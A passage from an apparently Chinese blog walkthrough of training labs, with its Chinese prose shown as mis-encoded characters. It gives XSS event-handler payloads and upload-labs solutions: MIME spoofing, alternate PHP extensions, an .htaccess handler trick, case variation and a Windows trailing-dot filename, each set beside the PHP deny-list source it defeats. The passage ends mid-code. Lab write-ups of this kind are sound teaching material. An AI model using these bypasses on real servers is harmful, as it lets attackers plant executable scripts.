class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>donmouseover<span class="hljs-operator">=</span>alert`<span class="hljs-number">1</span>`&gt;&lt;/iframe&gt;</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171803825.png" alt="image-20210303171803825" style="zoom:50%;"><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>æŸ¥çœ‹æºç æ‰¾åˆ°æ³¨å…¥ä½ç½®</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303172359498.png" alt="image-20210303172359498" style="zoom:50%;"><p>ä½†æ˜¯è¿™é‡Œè¿‡æ»¤<code>&lt;, &gt;</code>ï¼Œä½¿ç”¨äº‹ä»¶è§¦å‘å¼¹çª—</p><p>Payloadï¼š</p><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=&amp;arg02= <span class="hljs-attribute">onmouseover</span>=alert(1)</code></pre><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><p>ç¯å¢ƒä½¿ç”¨phpstudyå¾ˆå®¹æ˜“æ­å»º</p><h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯</p><h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>æŸ¥çœ‹æºç </p><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre><p>è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„<code>MIME</code>ç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡</p><p>æŠ“åŒ…ä¿®æ”¹MIMEå³å¯</p><p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><p> <strong>MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚</strong> </p><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain<span class="hljs-built_in">text</span>/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4<span class="hljs-built_in">application</span>/*<span class="hljs-built_in">application</span>/json<span class="hljs-built_in">application</span>/javascript<span class="hljs-built_in">application</span>/ecmascript<span class="hljs-built_in">application</span>/octet-stream</code></pre><p>æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ</p><h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre><p>åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡</p><h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>æ–‡ä»¶çš„ä½œç”¨</p><blockquote><ul><li>URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢</li><li>MIMEç±»å‹é…ç½®</li><li>è®¿é—®æƒé™æ§åˆ¶ç­‰</li><li>ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨</li><li>å›¾ç‰‡é˜²ç›—é“¾</li><li>è‡ªå®šä¹‰404é”™è¯¯é¡µé¢</li><li>é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ</li><li>ç›®å½•æµè§ˆä¸ä¸»é¡µ</li><li>ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹</li><li>æ–‡ä»¶å¯†ç ä¿æŠ¤</li></ul></blockquote><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre><p>è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š</p><p>é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ</p><p>æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ</p><p>ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª <code>1.jpg</code>å³å¯</p><h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜</p><img src="/2021/03/03/net-a-and-d/E:%5Cmyblog%5Cszyblog%5Csource%5C_posts%5Cuploads%5C5.png" style="zoom:50%;"><h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç </p><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span></code></pre><p>è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º<code>.pHp , .PHP</code>ç­‰</p><h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯</p><pre><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code></pre><p> <strong>åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ<code>1.php .</code>ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª<code>.</code>ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1<code>.php</code></strong> </p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" style="zoom:67%;"><h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span 